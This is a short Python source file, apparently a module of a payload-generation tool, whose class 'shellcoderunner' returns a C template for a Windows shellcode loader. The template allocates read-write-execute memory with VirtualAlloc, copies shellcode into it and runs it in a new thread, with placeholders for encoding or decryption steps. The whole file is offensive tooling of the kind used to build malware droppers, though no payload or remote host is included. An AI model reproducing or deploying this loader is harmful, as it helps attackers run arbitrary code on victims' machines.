class shellcoderunner:

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>"]

    def compilerOptions(self) -> list[str]:
        return []

    def template(self) -> str:
        return """
{imports}

{codeblocks}

int main() {{
    
    {transformers}
    // Allocate a region of RWX memory for shellcode
    LPVOID buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy our shellcode into memory that we just allocated (inside of our current process)
    memcpy(buffer, shellcode, {shellcodeSize});


    // Create thread to run shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

    // Wait for thread to finish
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Clean up by freeing the memory we allocated for our shellcode
    VirtualFree(buffer, 0, MEM_RELEASE);

    return 0;
}}
"""